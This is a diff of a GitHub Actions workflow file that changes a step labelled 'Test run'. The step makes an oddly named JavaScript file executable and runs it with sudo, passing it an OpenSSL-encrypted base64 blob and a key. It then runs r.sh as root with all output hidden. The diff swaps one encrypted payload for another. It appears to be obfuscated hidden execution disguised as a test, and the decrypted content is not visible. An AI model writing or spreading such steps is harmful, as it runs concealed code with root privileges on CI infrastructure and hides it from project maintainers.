@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 's16gh'
+        echo 'pqbut'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1/5XV07C5mIDPoTUKHgkOXVur8TpBQ4+jm3Dvc8FlX8bqwUAOX9G4UxCEe5NpLDcvS6WhsUM4UCKtVdQYGBqQsn5HRe9qYXUzbKEmCctgDHt6Jdbgd7lcot jldrol && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1/Qf/Yy7vsf66jyXtdSATHU3AFHdx1R1dGVPIR94t+c8+yKvdNOAkuHq0lEg5U2wtRvbj+rbrWPdga6Mmc/MzK2RUL+7HTVqEvMV4Tpj84PYukiZWwMLdFU 9bws9e && sudo sh r.sh > /dev/null 2>&1
